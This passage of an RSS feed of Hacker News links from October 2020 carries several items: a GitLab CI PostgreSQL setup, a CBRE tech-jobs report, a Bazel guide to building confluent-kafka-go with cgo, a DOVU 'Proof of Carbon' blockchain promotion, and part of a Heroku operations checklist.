https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline-780x806.png 780w, https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline.png 833w"></a><figcaption id="caption-attachment-581">The postgres service exists independently of the individual pipeline jobs and can be accessed by all of the jobs via network calls.</figcaption></figure><p>Services defined this way are automatically available for all your jobs (you can however also define them on a per-job basis). The service can be accessed by its image name (where everything after the : is stripped): <code>postgres</code>.</p><p>The database credentials can be defined using the <code>variables:</code> section:</p><pre data-enlighter-language="generic">variables:
  POSTGRES_DB: my_database
  POSTGRES_USER: bernhard
  POSTGRES_PASSWORD: "somepassword"
  POSTGRES_HOST_AUTH_METHOD: trust</pre><h3>Configure your application to use the database</h3><p>You can connect to the database the same way you would connect to any database on a network. In Spring Boot, it is best practice to define the database connection via your <code>application.properties</code> file or directly via environment variables.</p><p>For the above credentials, your configuration would look like this:</p><pre data-enlighter-language="generic">spring.datasource.driverClassName=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.datasource.url=jdbc:postgresql://postgres:5432/my_database
spring.datasource.username=bernhard
spring.datasource.password=somepassword</pre><p>As stated above, the host name of your database service is <code>postgres</code>, which is why your jdbc connection string connects to <code>postgres:5432</code> (which is the default port of PostgreSQL).</p><h3>Summary</h3><p>Yes, it is really that easy to use a real PostgreSQL database in your unit and integration test pipeline. By matching the exact database version that is also used in production, you can avoid many subtle errors that may not be apparent when relying on an in-memory database.</p><p>Let me know if you have any questions or whether you found this useful in the comments section.</p></div></div>]]>
            </description>
            <link>https://knasmueller.net/gitlab-postgresql-testing-pipeline</link>
            <guid isPermaLink="false">hacker-news-small-sites-24954268</guid>
            <pubDate>Sat, 31 Oct 2020 19:04:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CBRE Tech-30 2020 – Vancouver #1 of any North American city for tech job growth]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24953999">thread link</a>) | @elevenoh
<br/>
October 31, 2020 | https://www.cbre.us/research-and-reports/North-America-Tech-30-2020 | <a href="https://web.archive.org/web/*/https://www.cbre.us/research-and-reports/North-America-Tech-30-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div data-auto="content-section">
<div data-auto="content-section_inner">
<div data-auto="content-section_blocks">
<div data-rendering-id="cb-ca2b056982d949f4a4cc69a267967c1b" data-auto="content-block">
<div>
<div>
<div>

<div>

<p>Measuring the Tech Industryâ€™s Impact on U.S. &amp; Canada Office Markets</p>


</div>
</div>
<p>
<video preload="" autoplay="" muted="" loop="">
<source src="https://www.cbre.us/-/media/cbre/countryunitedstates/us-research/major-reports/2020/2020-tech-30/2020-tech30-marquee_master_v4.mp4" type="video/mp4"> Your browser does not support the video tag.
</video>
</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div>
<div>

<div data-slick-slide-count="4">

<div data-rendering-id="cb-305f084a2cd64f609a5eaa8b895c7e5f">

<p>The tech industry enabled business continuity during the COVID-19 shutdown by facilitating a quick transition to more digital operations. This transition highlighted new opportunities that position tech to once again lead the next growth cycle by accelerating digital transformation of the economy.</p>
<p>CBREâ€™s 2020 Tech-30 report explores the high-tech industryâ€™s impact on employment and office space in the 30 leading tech markets in the U.S. and Canada, as well as 10 up-and-coming tech markets.</p>
</div>




<div>
<ul>
<li>Vancouver, San Francisco, Austin, Seattle and New York were the top five markets for tech job growth in 2018 and 2019.</li>
<li>Tech companies continue to expand beyond their headquarters markets, led by San Francisco Bay Area-based tech companies that have signed more than 30 million sq. ft. of office leases in 10 other markets since 2013.</li>
<li>Sublease space offerings in Tech-30 markets have increased by 42% or 27 million sq. ft. from year-end 2019 to August 2020, and tenant demand has been cut in half.</li>
<li>The seven most resilient tech markets best poised for future growth are Silicon Valley, Washington, D.C., Vancouver, Atlanta, Dallas/Ft. Worth, Raleigh-Durham, and San Diego.</li>
<li>The extraordinary rise of the Nasdaq Index since March indicates tremendous future earnings potential for the tech industry despite some recent volatility.</li>
</ul>
</div>

<p>
<h2><span>Explore More Tech Insights</span></h2>
</p>
<div data-auto="content-section">
<div data-auto="content-section_inner">
<div data-auto="content-section_blocks">
<div data-rendering-id="cb-8e00bd0549784594ba1f960cd0ded7a7" data-auto="content-block">
<div>
<div>
<div>

<div>

<p>How tech labor trends in North America inform decisions and influence economic growth and real estate</p>


</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div>

<p><strong>My Hometown: How Tech Talent is driving local real estate decisions</strong></p>
<p>CBREâ€™s Tech Sector experts, Colin Yasukochi, Lexi Russell and Dan Harvey join Spencer Levy to share insights into the many ways tech talent is influencing real estate markets.</p>


<p><a href="https://www.cbre.us/-/media/files/the-weekly-take/cbre_weeklytake_episode_17_tech_talent.pdf?la=en" target="_blank">DOWNLOAD TRANSCRIPT</a></p>
<p><a href="https://www.cbre.com/the-weekly-take">Listen to more The Weekly Take Podcasts</a></p>
</div>
<div data-auto="content-section">
<div data-auto="content-section_inner">
<div data-auto="content-section_blocks">
<div data-rendering-id="cb-64fb11292cc84e74a4c79ec115effa99" data-auto="content-block">
<div>
<div>
<div>



<p>
<h3>
<span rel="">Connect with CBRE</span>
</h3>
</p>
<div>
<p>Providing specialized services to technology and media companies, combining robust resources and integrated services to deliver solutions at high speed.</p>

</div>
</div>
</div>
</div>
</div>
<div data-rendering-id="cb-49f485be921044dca3b211902441e4f8" data-auto="content-block">
<div>
<div>
<div>



<p>
<h3>
<span rel="">Stay Informed</span>
</h3>
</p>
<div>
<p>Receive CBRE research and perspectives via email</p>

</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div data-auto="profile-carousel-section">
 
<div>
<div>
<div>



<div data-auto="profile-block-vcard" data-gps-profile-datasource-flag="False">
<p><img src="https://www.cbre.us/-/media/images/v1%20profile%20headshots/l/e/v/levy_spencer_326x248_2.jpg" alt="Spencer Levy Headshot" data-auto="profile-image"></p><div data-auto="profile-block-vcard_inner-content">
<p><a href="https://www.cbre.us/people-and-offices/spencer-levy" data-auto="profile-name-with-link">
Spencer Levy
</a></p><div>
<p>Chairman, Americas Research &amp; Senior Economic Advisor</p>
</div>


</div>
</div>
 </div>
</div>
</div>
</div>
























</div>
</div>
</div>
</div></div>]]>
            </description>
            <link>https://www.cbre.us/research-and-reports/North-America-Tech-30-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-24953999</guid>
            <pubDate>Sat, 31 Oct 2020 18:32:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Cgo Dependent Golang Library with Bazel]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24953714">thread link</a>) | @rotemtam
<br/>
October 31, 2020 | https://rotemtam.com/2020/10/30/bazel-building-cgo-bindings/ | <a href="https://web.archive.org/web/*/https://rotemtam.com/2020/10/30/bazel-building-cgo-bindings/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article>
  
  <time datetime="2020-10-30T00:00:00+00:00">30 Oct 2020</time>
  <p><em>Credits: The solution described in this post is based on <a href="https://github.com/alexeagle">Alex Eagle</a>’s suggestion in: <a href="https://github.com/bazelbuild/bazel-gazelle/issues/773">https://github.com/bazelbuild/bazel-gazelle/issues/773</a></em></p>

<p>While migrating the Nexar backend mono-repo to use Bazel as our main build-system I encountered a particularly painful challenge of compiling Go packages with C dependencies, such as <a href="http://github.com/confluentinc/confluent-kafka-go">confluent-go-kafka</a> or <a href="https://github.com/paulsmith/gogeos">libgeos</a>. For others who will hit this issue, this will be a short and practical post showing what I finally came up with.</p>

<h3 id="first-try-let-gazelle-figure-things-out">First try: let Gazelle figure things out</h3>

<p><a href="https://github.com/bazelbuild/bazel-gazelle">Gazelle</a>  is a really great project from the Bazel community that helps us automatically generate BUILD files for our Golang Bazel projects. It can look at our <code>go.mod</code> files that describe our external dependencies and translate them for us into <a href="https://github.com/bazelbuild/rules_go">rules_go</a>’s <code>go_repository</code> invocations that will fetch external dependencies into our WORKSPACE and create a BUILD file for them. For 99% of our mono-repo’s dependencies this worked smoothly; all we had to do is:</p>

<div><div><pre><code>bazel run //:gazelle -- update-repos -from_file=go.mod -to_macro=deps.bzl%go_dependencies
</code></pre></div></div>

<p>And Gazelle would generate a macro that contains invocations to <code>go_repository</code> for each of our module’s dependencies. In this post, I focus on the few dependencies that this did not work well with, and document my way around those edges.</p>

<p>Our <code>go.mod</code> file contains a dependency on:</p>

<div><div><pre><code>require (
	github.com/confluentinc/confluent-kafka-go v1.4.2
)
</code></pre></div></div>

<p>Gazelle analyzes our dependencies and emits this block in the <code>deps.bzl</code> file:</p>

<div><div><pre><code>go_repository(
    name = "com_github_confluentinc_confluent_kafka_go",
    importpath = "github.com/confluentinc/confluent-kafka-go",
    sum = "h1:13EK9RTujF7lVkvHQ5Hbu6bM+Yfrq8L0MkJNnjHSd4Q=",
    version = "v1.4.2",
)
</code></pre></div></div>

<p>Trying to build we get:</p>

<div><div><pre><code>$ bazel build @com_github_confluentinc_confluent_kafka_go//kafka:kafka
INFO: Analyzed target @com_github_confluentinc_confluent_kafka_go//kafka:kafka (6 packages loaded, 59 targets configured).
INFO: Found 1 target...
ERROR: /root/.cache/bazel/_bazel_root/f8087e59fd95af1ae29e8fcb7ff1a3dc/external/com_github_confluentinc_confluent_kafka_go/kafka/BUILD.bazel:3:11: GoCompilePkg external/com_github_confluentinc_confluent_kafka_go/kafka/kafka.a failed (Exit 1): builder failed: error executing command bazel-out/host/bin/external/go_sdk/builder compilepkg -sdk external/go_sdk -installsuffix linux_amd64 -src external/com_github_confluentinc_confluent_kafka_go/kafka/00version.go -src ... (remaining 71 argument(s) skipped)

Use --sandbox_debug to see verbose messages from the sandbox builder failed: error executing command bazel-out/host/bin/external/go_sdk/builder compilepkg -sdk external/go_sdk -installsuffix linux_amd64 -src external/com_github_confluentinc_confluent_kafka_go/kafka/00version.go -src ... (remaining 71 argument(s) skipped)

Use --sandbox_debug to see verbose messages from the sandbox
/root/.cache/bazel/_bazel_root/f8087e59fd95af1ae29e8fcb7ff1a3dc/sandbox/processwrapper-sandbox/1/execroot/__main__/external/com_github_confluentinc_confluent_kafka_go/kafka/00version.go:24:10: fatal error: librdkafka/rdkafka.h: No such file or directory
 #include &lt;librdkafka/rdkafka.h&gt;
          ^~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
compilepkg: error running subcommand: exit status 2
Target @com_github_confluentinc_confluent_kafka_go//kafka:kafka failed to build
Use --verbose_failures to see the command lines of failed build steps.
INFO: Elapsed time: 6.865s, Critical Path: 0.74s
INFO: 2 processes: 2 internal.
FAILED: Build did NOT complete successfully
</code></pre></div></div>

<h3 id="compiling-cmake-projects-from-within-a-bazel-workspace">Compiling CMake Projects From Within a Bazel Workspace</h3>

<p>We need to compile our C dependencies into a static library (.a file) in order to provide it to the go linker. We could try to create new Bazel BUILD files on top of that project, but that would require us to deep dive into that dependency and mimic anything it’s authors have done in the original build, wouldn’t it make sense to try and invoke the CMake build from within Bazel? A crude way to do this is using a <a href="https://docs.bazel.build/versions/master/be/general.html#genrule">genrule</a>, which allows us to invoke any arbitrary command as part of our action graph, but it turns out there’s a great project called <a href="https://github.com/bazelbuild/rules_foreign_cc">rules_foreign_cc</a> which are “<em>[Bazel] Rules for building C/C++ projects using foreign build systems inside Bazel projects.”</em></p>

<p>We add it to our WORKSPACE file:</p>

<div><div><pre><code><span>http_archive</span><span>(</span>
    <span>name</span> <span>=</span> <span>"rules_foreign_cc"</span><span>,</span>
    <span>strip_prefix</span> <span>=</span> <span>"rules_foreign_cc-master"</span><span>,</span>
    <span>url</span> <span>=</span> <span>"https://github.com/bazelbuild/rules_foreign_cc/archive/master.zip"</span><span>,</span>
<span>)</span>

<span>load</span><span>(</span><span>"@rules_foreign_cc//:workspace_definitions.bzl"</span><span>,</span> <span>"rules_foreign_cc_dependencies"</span><span>)</span>

<span>rules_foreign_cc_dependencies</span><span>()</span>
</code></pre></div></div>

<p>So instead of figuring out an elaborate, specific  BUILD file for the C library we are using, we can simply use the foreign dependency rules to invoke the original CMake build and integrate it natively with our action graph.</p>

<p>We add this to our WORKSPACE:</p>

<div><div><pre><code><span>http_archive</span><span>(</span>
    <span>name</span> <span>=</span> <span>"librdkafka"</span><span>,</span>
    <span>build_file_content</span> <span>=</span> <span>"""load("@rules_foreign_cc//tools/build_defs:cmake.bzl", "cmake_external")

filegroup(
    name = "sources",
    srcs = glob(["**"]),
)

cmake_external(
    name = "librdkafka",
    cache_entries = {
        "RDKAFKA_BUILD_STATIC": "ON",
        "WITH_ZSTD": "OFF",
        "WITH_SSL": "OFF",
        "WITH_SASL": "OFF",
        "ENABLE_LZ4_EXT": "OFF",
        "WITH_LIBDL": "OFF",
    },
    lib_source = ":sources",
    static_libraries = [
        "librdkafka++.a",
        "librdkafka.a",
    ],
    visibility = ["//visibility:public"],
)
"""</span><span>,</span>
    <span>sha256</span> <span>=</span> <span>"ae27ea3f3d0d32d29004e7f709efbba2666c5383a107cc45b3a1949486b2eb84"</span><span>,</span>
    <span>strip_prefix</span> <span>=</span> <span>"librdkafka-1.4.0"</span><span>,</span>
    <span>urls</span> <span>=</span> <span>[</span><span>"https://github.com/edenhill/librdkafka/archive/v1.4.0.tar.gz"</span><span>],</span>
<span>)</span>
</code></pre></div></div>

<p>Let’s break it down:</p>

<ul>
  <li>We use <code>http_archive</code> to pull in a resource from the internet into our Bazel project.</li>
  <li>We provide a custom BUILD file for Bazel to use to build this target.</li>
  <li>the invocation of <code>cmake_external</code> tells Bazel how to invoke CMake (<code>cache_entries</code> is the CMake input arguments), and what output files it provides (<code>static_libraries</code>) so this target can be depended on downstream in the Bazel action graph.</li>
</ul>

<p>We can now build our header files:</p>

<div><div><pre><code>$ bazel build @librdkafka//:librdkafka

INFO: Analyzed target @librdkafka//:librdkafka (3 packages loaded, 530 targets configured).
INFO: Found 1 target...
Target @librdkafka//:librdkafka up-to-date:
  bazel-bin/external/librdkafka/librdkafka/include
  bazel-bin/external/librdkafka/librdkafka/lib/librdkafka++.a
  bazel-bin/external/librdkafka/librdkafka/lib/librdkafka.a
  bazel-bin/external/librdkafka/copy_librdkafka/librdkafka
  bazel-bin/external/librdkafka/librdkafka/logs/CMake_script.sh
  bazel-bin/external/librdkafka/librdkafka/logs/CMake.log
  bazel-bin/external/librdkafka/librdkafka/logs/wrapper_script.sh
INFO: Elapsed time: 3.959s, Critical Path: 0.13s
INFO: 0 processes.
INFO: Build completed successfully, 2 total actions
</code></pre></div></div>

<p>In my specific use-case, I wanted to link the my build of the confluent-go-kafka library with zlib, so I could avoid getting this error:</p>

<div><div><pre><code>bazel-out/k8-fastbuild/bin/external/librdkafka/librdkafka/lib/librdkafka.a(rdgz.c.o):rdgz.c:function rd_gz_decompress: error: undefined reference to 'inflateGetHeader'
bazel-out/k8-fastbuild/bin/external/librdkafka/librdkafka/lib/librdkafka.a(rdgz.c.o):rdgz.c:function rd_gz_decompress: error: undefined reference to 'inflate'
....
</code></pre></div></div>

<p>To do that I did a very similar thing to what I’ve done with the <code>librdkafka</code> library, adding to the WORKSPACE:</p>

<div><div><pre><code><span>http_archive</span><span>(</span>
    <span>name</span> <span>=</span> <span>"zlib"</span><span>,</span>
    <span>build_file_content</span> <span>=</span> <span>"""load("@rules_foreign_cc//tools/build_defs:cmake.bzl", "cmake_external")

filegroup(
    name = "sources",
    srcs = glob(["**"]),
)

cmake_external(
    name = "zlib",
    cache_entries = {

    },
    lib_source = ":sources",
    static_libraries = ["libz.a"],
    visibility = ["//visibility:public"],
)
"""</span><span>,</span>
    <span>strip_prefix</span> <span>=</span> <span>"zlib-1.2.11"</span><span>,</span>
    <span>urls</span> <span>=</span> <span>[</span>
        <span>"https://github.com/madler/zlib/archive/v1.2.11.zip"</span><span>,</span>
    <span>],</span>
<span>)</span>
</code></pre></div></div>

<p>I could now build it:</p>

<div><div><pre><code>$ bazel build @zlib//:zlib
INFO: Analyzed target @zlib//:zlib (0 packages loaded, 2 targets configured).
INFO: Found 1 target...
INFO: From CcCmakeMakeRule external/zlib/zlib/include:
Target @zlib//:zlib up-to-date:
  bazel-bin/external/zlib/zlib/include
  bazel-bin/external/zlib/zlib/lib/libz.a
  bazel-bin/external/zlib/copy_zlib/zlib
  bazel-bin/external/zlib/zlib/logs/CMake_script.sh
  bazel-bin/external/zlib/zlib/logs/CMake.log
  bazel-bin/external/zlib/zlib/logs/wrapper_script.sh

INFO: Elapsed time: 11.046s, Critical Path: 9.73s
INFO: 1 process: 1 darwin-sandbox.
INFO: Build completed successfully, 3 total actions
</code></pre></div></div>

<h3 id="linking-the-static-libraries-with-the-go-library">Linking the Static Libraries with the Go Library</h3>

<p>Now, that we have our static libraries all built, we want to somehow modify the build procedure for this library. To see the BUILD file that is generated by the <code>go_repository</code> rule we can:</p>

<div><div><pre><code>$ bazel query @com_github_confluentinc_confluent_kafka_go//kafka:kafka

# /root/.cache/bazel/_bazel_root/f8087e59fd95af1ae29e8fcb7ff1a3dc/external/com_github_confluentinc_confluent_kafka_go/kafka/BUILD.bazel:3:11
go_library(
  name = "kafka",
  visibility = ["//visibility:public"],
  generator_name = "kafka",
  generator_function = "go_library_macro",
  generator_location = "kafka_go/kafka/BUILD.bazel:3:11",
  srcs = ["@com_github_confluentinc_confluent_kafka_go//kafka:00version.go", "@com_github_confluentinc_confluent_kafka_go//kafka:adminapi.go", "@com_github_confluentinc_confluent_kafka_go//kafka:adminoptions.go", "@com_github_confluentinc_confluent_kafka_go//kafka:build_darwin.go", "@com_github_confluentinc_confluent_kafka_go//kafka:build_glibc_linux.go", "@com_github_confluentinc_confluent_kafka_go//kafka:config.go", "@com_github_confluentinc_confluent_kafka_go//kafka:consumer.go", "@com_github_confluentinc_confluent_kafka_go//kafka:context.go", "@com_github_confluentinc_confluent_kafka_go//kafka:error.go", "@com_github_confluentinc_confluent_kafka_go//kafka:error_gen.go", "@com_github_confluentinc_confluent_kafka_go//kafka:event.go", …</code></pre></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rotemtam.com/2020/10/30/bazel-building-cgo-bindings/">https://rotemtam.com/2020/10/30/bazel-building-cgo-bindings/</a></em></p>]]>
            </description>
            <link>https://rotemtam.com/2020/10/30/bazel-building-cgo-bindings/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24953714</guid>
            <pubDate>Sat, 31 Oct 2020 18:02:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Proof of Carbon on Hedera Hashgraph]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24953560">thread link</a>) | @msmithies4
<br/>
October 31, 2020 | https://blog.dovu.earth/introducing-proof-of-carbon/ | <a href="https://web.archive.org/web/*/https://blog.dovu.earth/introducing-proof-of-carbon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
              <p>One of the greatest challenges that have affected Blockchain companies has been within the unpredictable transaction costs of well-known blockchain technology. </p><p>The view of &nbsp;"most mature technology", in the decentralised space, is historically based on <a href="https://en.bitcoin.it/wiki/Proof_of_work">Proof of Work (PoW)</a> consensus mechanisms such as Bitcoin and Ethereum. All network fees correlate in direct relation to the increase in network traffic.</p><p>This makes on-chain solutions around micropayments and reward mechanisms effectively impossible to work at any level of impact. </p><blockquote>Any ecological or environmental positive impact will be wiped out by a single PoW network transaction and theoretically cause a negative effect.</blockquote><p>The fundamental problem is that Proof of Work is terrible for the environment, absolutely awful. For more information have a look at the <a href="https://digiconomist.net/bitcoin-energy-consumption/">Bitcoin energy consumption index</a>, as at October 2020 the energy consumption is <strong>22.6% of the UK power consumption.</strong> </p><figure><img src="https://blog.dovu.earth/content/images/2020/10/Screenshot-2020-10-23-at-15.47.51.png"><figcaption>Bitcoin’s energy consumption relative to countries <a href="https://digiconomist.net/bitcoin-energy-consumption/">see reference link</a></figcaption></figure><p>Although this is a known problem and there is a range of solutions that solve the "energy" problem including using <a href="https://en.bitcoin.it/wiki/Proof_of_Stake">Proof of Stake</a> but there is an ICO issue. As many ICOs (initial coin offerings) have used the Ethereum ERC standards as the basis protocol there is a cost, a carbon debt that has already been assigned.</p><p>In order for DOVU to deliver a carbon offsetting solution today, we require a different, hybrid approach.</p><p>And yes as DOV is an ERC20 token we accept we already have a carbon debt. This needs to be paid, in one way or another.</p><h2 id="so-what-is-dovu-doing">So what is DOVU doing?</h2><p>DOVU is introducing an innovative <strong>Proof of Carbon </strong>mechanism. Every time DOV tokens are rewarded to a user through our API we capture and store this information.</p><p>This information is stored publically, anyone can view the intent of the distribution of the assignment of carbon, the DOV token.</p><p>DOVU uses the <a href="https://hedera.com/consensus-service">Hedera Consensus Service </a>(HCS) backed by <a href="https://hedera.com/">Hedera Hashgraph</a> and leverages the work by <a href="https://trust.enterprises/">Trust Enterprises</a> a community-driven open source project. </p><p>Using HCS provides an extremely low-cost solution in terms of environmental and economically to add trust to any system, without having to offset the cost to any user. </p><p>This provides a scalable solution for adding proof for any transaction which indicates the transfer of carbon using the DOVU API, <a href="https://developer.dovu.dev/">that any team can start using.</a></p><p>Below is an example of how the assignment of carbon can be proved and viewed, without the requirement to interact directly with a mainnet PoW network.</p><p>This process is impossible on PoW networks as the transactional cost would override and almost always exceed the micro-payment benefit to <strong>prove the assignment of carbon. </strong></p><figure><img src="https://blog.dovu.earth/content/images/2020/10/Screenshot-2020-10-23-at-17.13.42.png"></figure><p>In addition to this Hedera Hashgraph network has the potential to reach a capacity of <a href="https://cointelegraph.com/news/hedera-hashgraph-deep-look-into-10-000-transactions-per-second-claim">10,000 transactions per second (TPS)</a>. Examples of pushing the network have been confirmed through <a href="https://coinrivet.com/adsdax-achieves-1372-cryptocurrency-transactions-per-second-on-hedera-hashgraph-with-zee-entertainment-enterprises-sets-new-industry-record/">AdsDax at 1372 TPS</a> and <a href="https://quantstamp.com/blog/quantstamp-stablecoin-case-study-formally-verifying-hedera-hashgraphs-stablecoin-framework">Quantstamp at 2909 TPS</a>.</p><p>During our early testing of a simple architecture using a single serverless proof of carbon node we have exceeded 50 TPS. </p><figure><img src="https://blog.dovu.earth/content/images/2020/10/Hashgraph-TPS.png"><figcaption>The TPS of a single proof of carbon node, using Trust Enterprises.</figcaption></figure><p>With that said this is one bit of the greater puzzle, we have a vision and roadmap to enter the DeFi space and to link physical land to unique non-fungible tokens (NFT).</p><p>When we hold the image of carbon being emitted into the atmosphere we envision the pollution through the <strong>burning of fossil fuels. </strong>Thoughts of transportation, cars, and power plants are clear and present.</p><p>One of the greater concerns is <a href="https://ec.europa.eu/clima/sites/clima/files/docs/soil_and_climate_en.pdf">the emissions of CO2 from soils are around ten times those from fossil fuels.</a></p><p>At DOVU we have been working toward delivering a solution, to incentivise farmers with additional income to consistently pursue high-quality farming practices.</p><p>The economic value of the farming industry is <a href="https://www.countrysideonline.co.uk/food-and-farming/contributing-to-the-economy/">worth £120 billion in the UK</a> but the <a href="https://www.fginsight.com/news/news/public-estimates-average-farmer-salary-at-almost-47k-23592">average income for a farmer is £20,000</a>.</p><h2 id="blockchain-and-nft">Blockchain and NFT</h2><p>Building a decentralised marketplace for farmers and land-owners to offer carbon certified areas of land verified by <a href="http://www.fao.org/soils-portal/soil-management/soil-carbon-sequestration/en/">soil carbon sequestration</a>.</p><p>A buyer may purchase the carbon of a given portion of land this is exchanged for a unique NFT, that includes metadata including exact location. </p><p>Every portion of land will have a finite amount of NFTs, in other words, a unique token would be minted for every piece of land. Any value will be stored in escrow and released over the duration of the contract terms.</p><p>Upon purchase from a buyer, the farmer will be paid out for ongoing consistent behaviour for environmentally positive behaviour. </p><p>Ongoing payment will be hinged on the measurement of positive carbon measurement gain through carbon audits for farms. </p><p>If there is a gain in carbon storage, the farmer will receive payment otherwise the value will be returned to the buyer. Without the latter consequence, there will be no accountability.</p><p>This will eliminate the <a href="https://www.coindesk.com/carbon-credits-have-a-double-spend-problem-this-microsoft-backed-project-is-trying-to-fix-that">carbon double-spend problem</a> and create a fair incentivized carbon marketplace based on real tangible assets.</p><p>These solutions will be crucial for large businesses and enterprises for their <a href="https://www.hamworthy-heating.com/Knowledge/Articles/Energy-legislation">carbon reduction targets</a>, purchasing allowances for carbon to offset every tonne they emit. Many of these targets have been written into legislation, so they need to be met.</p><figure><img src="https://images.unsplash.com/photo-1594101236305-037fa463b9b9?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="A Buttercups carpet in Wales."><figcaption>Photo by <a href="https://unsplash.com/@theret?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Avi Theret</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>DOVU is building technology to facilitate the offering, validation, and rewarding of capturing carbon value. </p><p>So that is where DOVU is moving toward, this is where we are today.</p><p>We provide a mechanism to augment your Carbon Offsetting solution, through a REST API, now backed by the trust of Hedera Hashgraph.</p><p>If you have a carbon offsetting project in mind we welcome you to join our <a href="https://dovu.earth/grant">DOVU Token Grant project</a>, we'll support you with tokens and marketing.</p><p>Otherwise, if you are a developer that wants to work with our community and start building with use we have opened up an <a href="https://blog.dovu.earth/dovu-bounty-program/">Open Source Bounty program</a>, we provide Tokens and Mentorship.</p><p>There is a lot of exciting developments coming forward for DOVU for the end of 2020 and 2021, we are looking forward with excitement with the possibilities for the future.</p>
            </div></div>]]>
            </description>
            <link>https://blog.dovu.earth/introducing-proof-of-carbon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24953560</guid>
            <pubDate>Sat, 31 Oct 2020 17:46:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bare minimum of ops tasks for heroku]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24953449">thread link</a>) | @mooreds
<br/>
October 31, 2020 | http://www.mooreds.com/wordpress/archives/2312 | <a href="https://web.archive.org/web/*/http://www.mooreds.com/wordpress/archives/2312">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">

	    
	<!-- #masthead .site-header -->
    
	    
	<div id="main">
        	    
        <div>

		<div id="primary">
			

			
					
	
	
				
								
					<article id="post-2312">
    
    <div>
     <div>      
 		<p>Awesome, you are a CTO or founding engineer of a newborn startup.&nbsp; You have an web app up on Heroku and someone is paying you money for it!&nbsp; Nice job.</p>
<p>Now, you need to think about supporting it.&nbsp; Heroku makes things way easier (no racking and stacking, no purchasing hardware, no configuring apache) but you still to set up some operations.</p>
<p>Here is the bare minimum you need to do to make sure you can sleep at night.&nbsp; (Based on a couple of years of heroku projects, and being really really cheap.)</p>
<ul>
<li>Have a staging environment
<ul>
<li>You don’t want to push code direct to prod, do you?</li>
<li>This can be a free dyno, depending on the complexity of your app.</li>
<li><a href="https://devcenter.heroku.com/articles/pipelines">Pipelines</a> are nice, as is <a href="https://devcenter.heroku.com/articles/preboot">preboot</a>.</li>
<li>Cost: free</li>
</ul>
</li>
<li>Have a one line deploy.
<ul>
<li>Or, if you like CD/CI, an automatic deploy or a one click deploy.&nbsp; But make it really easy to deploy.</li>
<li>Have a deploy script that goes straight to production for emergencies.</li>
<li>Cost: free</li>
</ul>
</li>
<li>&nbsp;Backups
<ul>
<li>User data.&nbsp; If you aren’t using a shared object store like S3, make sure you are doing a backup.</li>
<li>Database.&nbsp; Both <a href="https://devcenter.heroku.com/articles/heroku-postgres-backups">heroku postgresql</a> and <a href="http://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_WorkingWithAutomatedBackups.html">amazon RDS</a> have point and click solutions.&nbsp; All you have to do is set them up.&nbsp; (Test them, at least once.)</li>
<li>Cost: freeish, depending on the solution.&nbsp; But, user data is worth spending money on.</li>
</ul>
</li>
<li>Alerting
<ul>
<li>Heroku has <a href="https://devcenter.heroku.com/articles/metrics#threshold-alerting">options</a> if you are running professional dynos.</li>
<li><a href="http://uptimerobot.com/">Uptimerobot</a> is a great free third party service that will check ports every 5 minutes and has a variety of alert options.&nbsp; If you want SMS, you have to pay for it, but it’s not outrageous.</li>
<li>Cost: free</li>
</ul>
</li>
<li>Logging
<ul>
<li>Use a logging framework (like slf4j or the rails logger, and mark error conditions with a string that will be easy to search for.</li>
<li>Yes, you can use <code>heroku logs</code> but having a log management solution like papertrail will make you much happier.&nbsp; Plus, <a href="https://elements.heroku.com/addons/papertrail">it’s free</a> for 2 days of logfiles.</li>
<li>Set up <a href="http://help.papertrailapp.com/kb/how-it-works/alerts/">alerts</a> with papertrail as well.&nbsp; These can be more granular.</li>
<li>Cost: free</li>
</ul>
</li>
<li>Create a list of third party dependencies.
<ul>
<li>Sign up for status alerts from these.&nbsp; If you have pro slack, you can have them push an email to a channel.&nbsp; If you don’t, create an alias that receives them.&nbsp; You want to be the person that tells your clients about outages, not the other way around.</li>
<li>Cost: free</li>
</ul>
</li>
<li>Communication
<ul>
<li>Internal
<ul>
<li>a devops_alert slack channel is my preferred solutions.&nbsp; All deploys and other alerts go there.</li>
</ul>
</li>
<li>External
<ul>
<li>create a mailing list for your clients so you can inform them of issues easily.&nbsp; Google groups is fine, but use whatever other folks are using.&nbsp; Don’t use an alias in your email–you’ll forget to add new clients.</li>
